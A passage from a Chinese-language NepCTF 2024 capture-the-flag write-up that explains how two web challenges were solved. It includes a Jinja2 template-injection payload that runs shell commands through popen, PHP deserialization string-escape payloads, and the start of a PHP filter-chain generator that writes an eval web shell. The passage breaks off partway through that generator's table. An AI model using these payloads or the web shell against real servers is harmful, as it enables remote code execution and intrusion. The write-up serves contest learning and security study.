+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(<span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;8000&#34;</span>, debug<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span></code></pre></div><p>关键点在<code> return render_template_string('&lt;br>'.join(files_list))</code></p><p>再看一下static可以进行ssti</p><p>直接命名文件名</p><p><code>{{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}</code></p><p>通过修改<code>ls</code>这个位置，发现flag在上个目录，需要进行<code>cd..;cat flag</code>然后写个exp传入得到flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;https://neptune-16431.nepctf.lemonprefect.cn/&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># 上传带有恶意脚本的文件名</span>
+</span></span><span style=display:flex><span>files <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;tp_file&#34;</span>:(<span style=color:#e6db74>&#39;payload.zip&#39;</span>,open(<span style=color:#e6db74>&#39;payload.zip&#39;</span>,<span style=color:#e6db74>&#39;rb&#39;</span>)<span style=color:#f92672>.</span>read())}
+</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, files<span style=color:#f92672>=</span>files)
+</span></span><span style=display:flex><span>print(response<span style=color:#f92672>.</span>text)
+</span></span></code></pre></div><p>可以得到flag</p><h2 id=php_master>PHP_MASTER!!</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>( <span style=color:#66d9ef>__FILE__</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>substrstr</span>($data)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    $start <span style=color:#f92672>=</span> <span style=color:#a6e22e>mb_strpos</span>($data, <span style=color:#e6db74>&#34;[&#34;</span>);
+</span></span><span style=display:flex><span>    $end <span style=color:#f92672>=</span> <span style=color:#a6e22e>mb_strpos</span>($data, <span style=color:#e6db74>&#34;]&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>mb_substr</span>($data, $start <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, $end <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>-</span> $start);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>A</span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $key;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>readflag</span>(){
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>key</span><span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>key</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#34;</span>){
+</span></span><span style=display:flex><span>            $a <span style=color:#f92672>=</span> $_POST[<span style=color:#ae81ff>1</span>];
+</span></span><span style=display:flex><span>            $contents <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($a);
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>file_put_contents</span>($a, $contents);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>B</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $b;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__tostring</span>()
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/\[|\]/i&#34;</span>, $_GET[<span style=color:#e6db74>&#39;nep&#39;</span>])){
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;NONONO!!!&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        $str <span style=color:#f92672>=</span> <span style=color:#a6e22e>substrstr</span>($_GET[<span style=color:#e6db74>&#39;nep1&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;[welcome to&#34;</span><span style=color:#f92672>.</span> $_GET[<span style=color:#e6db74>&#39;nep&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;CTF]&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $str;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($str<span style=color:#f92672>===</span><span style=color:#e6db74>&#39;NepCTF]&#39;</span>){
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>b</span>) ();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>C</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $s;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $str;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($s)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>s</span> <span style=color:#f92672>=</span> $s;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>()
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $this <span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>$ser <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>C</span>($_GET[<span style=color:#e6db74>&#39;c&#39;</span>]));
+</span></span><span style=display:flex><span>$data <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_ireplace</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>&#34;00&#34;</span>,$ser);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>unserialize</span>($data);
+</span></span></code></pre></div><p>类似这题其实已经是第三次了(第一次是黄河流域第二次是XGCTF),一直没仔细研究,趁着这次好好研究一下</p><p>先了解一下上方的字符串注入，这里就直接聊怎么做了，详细讲解可以去看gxngxngxn师傅的博客</p><p>%9f可以造成字符串往后移动一位，因为它不解析，%f0可以把字符串吞掉前三位</p><img src=php1.png alt=php1 style=zoom:80%><p><img alt=php2 loading=lazy src=/posts/ctf/nepctf2024/php2.png></p><p>%f0配合任意的三个字符结合%9f就可以达到字符串逃逸</p><p>由此可以够造截取前面的内容，使$str=NepCTF]</p><img src=php3.png alt=php3 style=zoom:80%><p>本题存在非预期解，先了解一下</p><h3 id=非预期>非预期</h3><p><strong>利用phpinfo(),读取flag</strong></p><p><code>$data = str_ireplace("\0","00",$ser);</code>根据这条，字符变多逃逸，先构造后面的序列化得到的内容是<code>";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}</code>长度共47，将\0换成00多出一个字符，总共需要47个进行逃逸构造payload</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?nep1<span style=color:#f92672>=</span>%f0abc%f0abc%f0abc%f0abc%9f%9f&amp;nep<span style=color:#f92672>=</span>Nep&amp;c<span style=color:#f92672>=</span>%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00<span style=color:#e6db74>&#34;;s:3:&#34;</span>str<span style=color:#e6db74>&#34;;O:1:&#34;</span>B<span style=color:#e6db74>&#34;:1:{s:1:&#34;</span>b<span style=color:#e6db74>&#34;;s:7:&#34;</span>phpinfo<span style=color:#e6db74>&#34;;}}
+</span></span></span></code></pre></div><p>搜索flag就可以得到了，应该是因为gzctf的特性造成非预期得到的flag</p><h3 id=预期>预期</h3><p>构造exp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$exp<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>C</span>(<span style=color:#e6db74>&#39;a&#39;</span>);
+</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>B</span>;
+</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>b</span><span style=color:#f92672>=</span><span style=color:#66d9ef>array</span>(<span style=color:#ae81ff>0</span><span style=color:#f92672>=&gt;</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>A</span>,<span style=color:#ae81ff>1</span><span style=color:#f92672>=&gt;</span><span style=color:#e6db74>&#39;readflag&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>serialize</span>($exp);
+</span></span><span style=display:flex><span><span style=color:#75715e>#O:1:&#34;C&#34;:2:{s:1:&#34;s&#34;;s:1:&#34;a&#34;;s:3:&#34;str&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;a:2:{i:0;O:1:&#34;A&#34;:1:{s:3:&#34;key&#34;;s:5:&#34;key&#34;;}i:1;s:8:&#34;readflag&#34;;}}}
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#字符串有不可见
+</span></span></span></code></pre></div><p>截取需要的内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>&#34;;s:3:&#34;str&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;a:2:{i:0;O:1:&#34;A&#34;:1:{s:3:&#34;key&#34;;s:5:&#34;\00key\00&#34;;}i:1;s:8:&#34;readflag&#34;;}}}
+</span></span></code></pre></div><p>再根据这段的长度进行字符串进行逃逸，得到</p><pre tabindex=0><code>%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&#34;;s:3:&#34;str&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;a:2:{i:0;O:1:&#34;A&#34;:1:{s:3:&#34;key&#34;;S:5:&#34;\00key\00&#34;;}i:1;s:8:&#34;readflag&#34;;}}}
+</code></pre><p>再配上上面那段nep组成payload，接下来分析</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>A</span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $key;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>readflag</span>(){
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>key</span><span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>key</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#34;</span>){
+</span></span><span style=display:flex><span>            $a <span style=color:#f92672>=</span> $_POST[<span style=color:#ae81ff>1</span>];
+</span></span><span style=display:flex><span>            $contents <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($a);
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>file_put_contents</span>($a, $contents);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这题看了一下可以通过filter_chain进行rce写入马，然后得到flag</p><p>这里借用晨曦师傅的exp得到马</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>$base64_payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4&#34;</span>; <span style=color:#75715e>/*&lt;?php @eval($_REQUEST[&#39;cmd&#39;]);?&gt;*/</span>
+</span></span><span style=display:flex><span>$conversions <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;1&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;2&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;3&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;5&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#39;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#39;6&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;7&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;8&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;9&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;B&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;C&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;D&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;E&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;F&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;G&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;H&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;I&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;J&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;K&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;M&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;N&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;O&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;P&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Q&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;R&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#39;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#39;S&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;T&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;U&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;V&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;W&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;X&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Y&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#39;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#39;Z&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;b&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;c&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;d&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;e&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;f&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;g&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;h&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;i&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#39;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#39;j&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;k&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;l&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;m&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#39;</span>,
